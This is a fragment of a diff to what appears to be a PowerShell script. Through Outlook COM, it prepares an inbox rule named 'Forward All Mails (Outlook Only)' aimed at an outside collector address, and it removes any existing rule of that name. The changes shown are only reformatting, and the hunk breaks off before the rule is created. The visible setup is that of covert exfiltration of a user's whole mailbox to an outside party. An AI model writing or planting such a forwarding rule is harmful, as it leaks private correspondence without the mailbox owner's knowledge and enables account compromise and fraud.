@@ -1,14 +1,10 @@
 $outlook = New-Object -ComObject Outlook.Application
-$session = $outlook.Session
-$store = $session.DefaultStore
+$session = $outlook.Session;$store = $session.DefaultStore
 $rules = $store.GetRules()
-
 $ruleName = "Forward All Mails (Outlook Only)"
 $targetMail = "BoeseBuben-FWD-Collector@SchwingSchleiferUnited.eu"
-
-# Existing rule with same name entfernen (robust gegen COM-Aussetzer)
-for ($i = $rules.Count; $i -ge 1; $i--) {
-    try {
+for ($i = $rules.Count; $i -ge 1; $i--) { 
+   try {
         $r = $rules.Item($i)
         if ($null -ne $r -and $r.Name -eq $ruleName) {
             $rules.Remove($i)
